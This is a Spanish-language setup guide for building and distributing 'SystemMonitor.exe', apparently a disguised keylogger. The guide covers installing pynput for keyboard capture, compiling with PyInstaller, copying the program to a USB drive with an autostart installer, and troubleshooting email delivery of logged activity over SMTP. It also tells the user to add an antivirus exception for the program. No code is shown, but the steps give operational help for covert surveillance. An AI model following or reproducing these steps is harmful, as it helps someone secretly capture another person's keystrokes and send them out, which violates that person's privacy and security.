1️⃣ INSTALAR PYTHON (Si no lo tienes)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   Opción A - Instalación Manual:
   ────────────────────────────────
   a) Ve a: https://www.python.org/downloads/
   b) Descarga Python 3.11 (32-bit para máxima compatibilidad)
   c) Durante instalación:
      ✓ Marca: "Add Python to PATH"
      ✓ Marca: "Install for all users" (opcional)
   d) Reinicia la terminal después de instalar

   Opción B - Instalación Automática:
   ────────────────────────────────────
   • El script instalar_y_compilar.bat puede descargar
     e instalar Python automáticamente
   • Solo sigue las instrucciones en pantalla


2️⃣ COMPILAR EL EJECUTABLE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   a) Haz clic derecho en: instalar_y_compilar.bat
   b) Selecciona "Ejecutar como administrador"
   c) El script automáticamente:
      • Detecta tu sistema (32 o 64-bit)
      • Instala pip si no existe
      • Instala pynput (captura de teclado)
      • Instala pyinstaller (compilador)
      • Compila el .exe
   d) Espera 1-3 minutos
   
   ✓ Resultado:
      • Carpeta: dist\
      • Archivo: SystemMonitor.exe (o SystemMonitor_x86.exe/x64.exe)


3️⃣ PREPARAR PARA DISTRIBUCIÓN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   Copia estos archivos a un USB:
   
   📁 Carpeta USB:
      ├── SystemMonitor.exe                    (de la carpeta dist/)
      ├── instalar_inicio_automatico.bat
      └── desinstalar.bat

  SOLUCIÓN DE PROBLEMAS
═══════════════════════════════════════════════════════════════

❌ "Python no está instalado"
   → Instala Python desde: https://www.python.org/downloads/
   → Marca "Add Python to PATH" durante instalación

❌ "No se encuentra SystemMonitor.exe"
   → Verifica que ejecutaste: instalar_y_compilar.bat
   → Busca en la carpeta: dist\

❌ "No recibo correos"
   → Verifica la hora del sistema del PC
   → Revisa que haya actividad registrada
   → Confirma credenciales SMTP en el código

❌ "El programa no inicia con Windows"
   → Ejecuta el instalador como administrador
   → Verifica: Win + R → shell:startup

❌ "Antivirus bloquea el programa"
   → Agrega excepción en el antivirus para:
     %APPDATA%\SystemMonitor\SystemMonitor.exe
